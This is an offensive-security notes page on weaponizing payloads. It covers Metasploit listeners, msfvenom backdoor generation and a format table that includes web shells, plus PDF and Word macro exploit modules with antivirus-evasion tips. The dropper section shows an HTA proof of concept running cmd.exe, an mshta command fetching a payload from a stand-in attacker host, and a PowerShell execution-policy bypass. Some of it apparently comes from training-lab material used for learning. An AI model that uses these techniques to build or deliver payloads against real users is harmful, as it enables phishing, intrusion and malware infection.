# Injecting Payload

## Metasploit&#x20;

### &#x20;Listener&#x20;

```bash
use exploit/multi/handler
```

### Msfvenom to other file

```bash
msfvenom -p <payload> LHOST=YOUR_IP LPORT=4444 -f exe -o payload.exe
```

{% embed url="https://www.clawnix.com/" %}

üß© `msfvenom` Payload Format Table

| Format Type              | `msfvenom` Flag (`-f`) | File Extension | Typical Use Case                             |
| ------------------------ | ---------------------- | -------------- | -------------------------------------------- |
| **Windows Binary**       | `exe`                  | `.exe`         | Windows executable backdoor or dropper       |
| **Dynamic Link Library** | `dll`                  | `.dll`         | DLL injection or sideloading                 |
| **PowerShell Script**    | `ps1`                  | `.ps1`         | In-memory execution via PowerShell           |
| **Batch Script**         | `raw` (as `.bat`)      | `.bat`         | Simple batch-based payload delivery          |
| **Shellcode (C)**        | `c`                    | `.c`           | Inject into custom C programs                |
| **Shellcode (Python)**   | `python`               | `.py`          | Use with Python loaders                      |
| **Shellcode (Raw)**      | `raw`                  | `.bin`         | Custom loaders or memory injection           |
| **HTA Payload**          | `hta-psh`              | `.hta`         | Used in phishing and browser-based delivery  |
| **Java Payload**         | `jar`                  | `.jar`         | For exploiting Java apps or JNLP delivery    |
| **Android APK**          | _(no flag needed)_     | `.apk`         | Android device backdoor                      |
| **Linux ELF**            | `elf`                  | `.elf`         | Executable on Linux systems                  |
| **macOS Mach-O**         | `macho`                | `.macho`       | Payloads for macOS targets                   |
| **PHP Web Shell**        | `raw`                  | `.php`         | Upload to web servers for command execution  |
| **ASP Web Shell**        | `asp`                  | `.asp`         | Exploit ASP-based web servers                |
| **JSP Web Shell**        | `jsp`                  | `.jsp`         | Target Java-based web servers (Tomcat, etc.) |

## Veil Evasion EXE&#x20;

Better msfvenom

{% content-ref url="../defense-evasion/av-evasion-and-obfuscation/encoding/payload-encoding-obfuscation.md" %}
[payload-encoding-obfuscation.md](../defense-evasion/av-evasion-and-obfuscation/encoding/payload-encoding-obfuscation.md)
{% endcontent-ref %}

## PDF Payload

### Metasploit exploits

üìÑ `exploit/windows/fileformat/adobe_pdf_embedded_exe`

* **Description**: Embeds an EXE into a PDF using **JavaScript** for execution.
* **Technique**: Leverages **JavaScript triggers** inside the PDF to execute the embedded EXE when the victim opens the file.
* **More reliable** on older versions of Adobe Reader where JavaScript execution is enabled.
* **More likely to be flagged** by AV or sandbox because JavaScript in PDFs is a red flag.

#### üî• Pros:

* Higher chance of execution **if JavaScript is allowed**.
* Can be more dynamic and interactive (e.g., auto-launch on open).

#### ‚ùå Cons:

* Depends on **JavaScript being enabled** in Adobe Reader.
* Newer versions of Adobe Reader **disable or restrict JS** by default.
* Easier for security tools to detect.

{% hint style="warning" %}
To encode the pdf to avoid AV we need to use a custom msfvenom exe and not the default exploit exe, that we encoded and then on the exploit settings we set the exe
{% endhint %}

***

üìÑ `exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs`

* **Description**: Same as the above but **without JavaScript**.
* **Technique**: Embeds the EXE inside a PDF **without using JS to trigger it**.
* Requires **manual interaction** by the victim (e.g., double-clicking a file icon inside the PDF).
  * Less suspicious to AV because it doesn‚Äôt rely on script-based triggers.

#### üî• Pros:

* **Better AV evasion** ‚Äî no JavaScript means fewer red flags.
* **Works even if JavaScript is disabled** in Adobe Reader.

#### ‚ùå Cons:

* **Less reliable** because it depends on user interaction.
* May be harder to convince someone to execute the embedded EXE.

{% hint style="warning" %}
To encode the pdf to avoid AV we need to use a custom msfvenom exe and not the default exploit exe, that we encoded and then on the exploit settings we set the exe
{% endhint %}

### Pdf revshell maker

{% embed url="https://github.com/ASTRA-LabsHQ/Malware-Development/tree/main" %}

{% file src="../../../../.gitbook/assets/PDFReverseShell.zip" %}

{% embed url="https://www.youtube.com/watch?v=ygrVBsBw31Y" %}

## Setoolkit

Modules

## &#x20;MS Word Payload

```
use exploit/windows/fileformat/office_word_macro
```

* Generates `.doc` file with VBA macro that drops & runs a payload.
* Works regardless of Office version **if macros are enabled**.
* AV may catch the macro or payload ‚Äî obfuscation is key.

{% hint style="warning" %}
To encode the word file to avoid AV we need to use a custom msfvenom exe and not the default exploit exe, that we encoded and then on the exploit settings we set the exe
{% endhint %}

## Droppers

### Windows Scripting Host - WSH

Windows scripting host is a built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system.

Now let's write a simple VBScript code to create a windows message box that shows the Welcome to THM message. Make sure to save the following code into a file, for example, hello.vbs.

```javascript
Dim message 
message = "Welcome to THM"
MsgBox message
```

<figure><img src="../../../../.gitbook/assets/f40a7711a408932981d827bfe6e522f3.png" alt="" width="466"><figcaption></figcaption></figure>

‚úÖ **What is Windows Scripting Host (WSH)**

WSH is a built-in Windows feature that runs scripts written in:

* **VBScript (.vbs)**
* **JScript (.js)**
* **WSF (.wsf composite scripts)**

It uses two key executables:

* `wscript.exe` ‚Üí GUI mode
* `cscript.exe` ‚Üí Console mode

Attackers love WSH because **every Windows system has it**, and defenders sometimes overlook scripting engines.

***

**üõë How Hackers&#x20;**_**Abuse**_**&#x20;WSH (High-Level, Defensive Explanation)**

1Ô∏è‚É£ **Initial Payload Delivery**

Threat actors often send malicious VBS/JS scripts through:

* Email attachments
* Compressed ZIP files
* Malicious downloaders
* Fake installers

When the victim double-clicks it, **WSH executes the script**.

This makes WSH a common first-stage loader in malware campaigns.

### HTML Application (HTA)

**An HTA (HTML Application)** is a file with the extension:

**It looks like a web page, but runs with full Windows privileges, not browser sandbox restrictions.**

HTA stands for ‚ÄúHTML Application.‚Äù It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered. HTML Applications, also known as HTAs, which are dynamic HTML pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool mshta is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer.&#x20;

In the following example, we will use an [ActiveXObject](https://en.wikipedia.org/wiki/ActiveX) in our payload as proof of concept to execute cmd.exe. Consider the following HTML code.

```
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

**URL-Based HTA Execution (No File Needed)**

Attackers can execute an HTA straight from the internet:

Then serve the payload.hta from a web server, this could be done from the attacking machine as follows

```
mshta.exe http://attacker.com/payload.hta
```

**HTA Reverse Connection**

We can create a reverse shell payload

**üõë Why Hackers Abuse HTA Files**

1. **HTAs run with full user privileges (no browser sandbox)**
2. **mshta.exe is a trusted LOLBin (Living-Off-The-Land Binary)**
3. **HTAs support JavaScript, VBScript, and ActiveX**
4. **HTAs can be executed remotely (from a URL)**
5. **Defenders often ignore mshta logs**

HTAs are basically the attacker‚Äôs dream combo of:

* HTML flexibility
* Script execution
* Native OS access

**PowerShell Execution via HTA**

HTAs can launch PowerShell quietly:

* Through ActiveX objects
* Through WScript shell
* Through COM objects

Attackers use this to deliver:

* C2 beacons
* Reverse shells
* RAT payloads
* Fileless malware

### Visual Basic for Application (VBA)

VBA stands for Visual Basic for Applications, a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, PowerPoint, etc. VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications. **Macros**

```
Sub THM()
  MsgBox ("Welcome to Weaponization Room!")
End Sub
```

## PowerShell (PSH)

{% hint style="warning" %}
PowerShell's execution policy is a security option to protect the system from running malicious scripts. By default, Microsoft disables executing PowerShell scripts .ps1 for security purposes. The PowerShell execution policy is set to Restricted, which means it permits individual commands but not run any scripts.
{% endhint %}

**Bypass Execution Policy**

Microsoft provides ways to disable this restriction. One of these ways is by giving an argument option to the PowerShell command to change it to your desired setting. For example, we can change it to bypass policy which means nothing is blocked or restricted. This is useful since that lets us run our own PowerShell scripts.

```
C:\Users\thm\Desktop>powershell -ex bypass -File thm.ps1
```
